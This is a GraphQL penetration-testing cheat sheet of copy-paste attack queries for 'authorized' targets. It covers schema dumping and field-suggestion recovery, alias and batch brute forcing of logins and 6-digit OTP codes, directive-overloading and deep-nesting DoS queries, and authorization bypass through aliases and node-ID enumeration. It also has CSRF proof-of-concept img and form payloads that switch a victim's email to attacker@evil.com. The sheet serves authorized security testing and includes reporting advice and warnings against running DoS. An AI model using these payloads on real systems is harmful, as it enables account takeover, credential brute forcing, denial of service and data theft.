# GraphQL Testing Pack

Copy-pasteable queries for testing GraphQL endpoints on **authorized** targets. Swap `TARGET` and
endpoint path (`/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`, `/query`). Validate every finding
against the Trinet Validation Ladder — introspection or GET support alone is not a reportable bug
without impact.

---

## 1. Full introspection query

Confirms the schema is exposed and dumps every type, field, arg, and directive.

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives {
      name
      description
      locations
      args { ...InputValue }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name
    ofType { kind name ofType { kind name ofType { kind name } } } } } } }
}
```

curl one-liner (send as POST JSON):
```bash
curl -s https://TARGET/graphql -H 'Content-Type: application/json' \
  -d '{"query":"query{__schema{types{name fields{name}}}}"}' | jq .
```

Tools when introspection is disabled: **clairvoyance** (infers schema via field suggestions),
**graphql-cop** (security-focused audit), **graphw00f** (fingerprints the engine), **InQL** (Burp).

---

## 2. Field suggestion leakage (schema recovery when introspection is off)

Servers that return "Did you mean X?" leak field/type names one guess at a time.

```graphql
query { user { usr } }
```
Response: `Cannot query field "usr" on type "User". Did you mean "user", "username", or "userId"?`

Probe systematically — mutation names, admin fields, hidden types:
```graphql
query { admn }          # → "Did you mean admin?"
mutation { deleteUsr }  # → suggests deleteUser
```
clairvoyance automates this: `clairvoyance https://TARGET/graphql -o schema.json -w wordlist.txt`.

---

## 3. Alias / batching abuse

Run many operations in one HTTP request — brute-forces credentials/OTP, bypasses per-request rate
limits, and amplifies cost. Each alias is a separate field execution.

Alias-based brute force (100 login attempts, one request):
```graphql
mutation {
  a1: login(user:"admin", pass:"pass1")  { token }
  a2: login(user:"admin", pass:"pass2")  { token }
  a3: login(user:"admin", pass:"pass3")  { token }
  # ... a4 ... a100
}
```

OTP / 2FA brute via aliases:
```graphql
mutation {
  c000: verifyOtp(code:"000000"){ok}
  c001: verifyOtp(code:"000001"){ok}
  # ... enumerate the full 6-digit space across batched requests
}
```

Array-batching (many independent operations in a JSON array — if the server accepts it):
```json
[
  {"query":"mutation{login(user:\"admin\",pass:\"a\"){token}}"},
  {"query":"mutation{login(user:\"admin\",pass:\"b\"){token}}"}
]
```
Report angle: rate limits keyed per-HTTP-request are defeated by batching; enforce per-operation cost.

---

## 4. Directive-overloading DoS (`@skip` / `@include`)

Repeating `@skip`/`@include` (and duplicating fields/aliases) blows up parse/validation cost. Flag the
**possibility** — do not actually take the endpoint down.

```graphql
query {
  __typename
    @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false)
    @include(if:true) @include(if:true) @include(if:true) @include(if:true)
    # ... hundreds/thousands of repeated directives
}
```
Amplify by combining with field duplication:
```graphql
query { user { id id id id id id id id } }   # repeat the field N thousand times
```
Absence of a directive/field-count limit + no query-cost analysis is the reportable gap. Combine with
deep nesting (§5) and aliasing (§3) for maximum amplification — describe it, don't execute a query-of-death.

---

## 5. Deep-nesting DoS

When types reference each other (e.g. `User → posts → author → posts → ...`), a deeply nested query
forces exponential resolution. Demonstrate the shape; keep depth low enough not to actually DoS.

```graphql
query {
  user(id:"1") {
    posts {
      author {
        posts {
          author {
            posts {
              author { id }   # nest as deep as the schema allows
            }
          }
        }
      }
    }
  }
}
```
Reportable gap: no **depth limit**, no **query complexity/cost limit**, no **timeout**. Cite it as a
design flaw (do not run an unbounded recursive query on a production target).

---

## 6. GET-based CSRF

If the endpoint executes queries — and especially **mutations** — over `GET` with a `query` param, and
there is no CSRF token / SameSite protection, it is CSRF-able.

```
GET https://TARGET/graphql?query={me{email}}
GET https://TARGET/graphql?query=mutation{deleteAccount}          # mutation over GET = high impact
GET https://TARGET/graphql?query=mutation%7BupdateEmail(email%3A%22attacker%40evil.com%22)%7D
```
CSRF PoC (auto-submitting / image tag — no token needed if state-changing mutation runs over GET):
```html
<img src="https://TARGET/graphql?query=mutation{updateEmail(email:%22attacker@evil.com%22)}">
```
Also test `application/x-www-form-urlencoded` POST (form-submittable cross-origin, unlike JSON):
```html
<form action="https://TARGET/graphql" method="POST">
  <input name="query" value="mutation{deleteAccount}">
</form>
```
Report only if a **state-changing** operation runs this way without CSRF defenses.

---

## 7. Authz bypass via alias / alternate path

Object-level (BOLA) and function-level (BFLA) authz gaps often hide behind an unguarded edge or an
alias that dodges a per-field/per-request check.

Reach the same object by a different query path that skips the authz check:
```graphql
# Blocked directly:
query { adminUser(id:"5") { ssn } }        # → denied

# Reachable via an edge that forgot the check:
query { company(id:"1") { employees { ssn salary } } }
```

Alias-based check evasion (a guard that only inspects the first/named field):
```graphql
query {
  legit: publicProfile(id:"1") { name }
  leak:  user(id:"2") { email passwordHash }   # aliased alongside a benign field
}
```

Cross-tenant / IDOR through node lookups:
```graphql
query { node(id:"VXNlcjoy") { ... on User { email } } }   # decode/enumerate global node IDs
```

Mutation missing authz:
```graphql
mutation { updateUserRole(userId:"me", role:"ADMIN") { id role } }
```
Prove with a second (lower-priv) account: the same query returning another tenant's data is the finding.

---

## Quick workflow

1. Fingerprint engine (graphw00f) and pull the schema (introspection §1, else field suggestion §2 / clairvoyance).
2. Map queries vs mutations; list every ID-bearing field and every mutation.
3. Replay ID-bearing queries across two accounts (§7 BOLA); call mutations as low-priv (§7 BFLA).
4. Test batching/aliasing against auth + rate-limited operations (§3); probe GET/CSRF (§6).
5. Note DoS gaps (§4 directives, §5 depth) as design flaws — do not execute a query-of-death.

Cross-reference: JWT/token attacks on the auth layer live in [jwt.md](jwt.md).
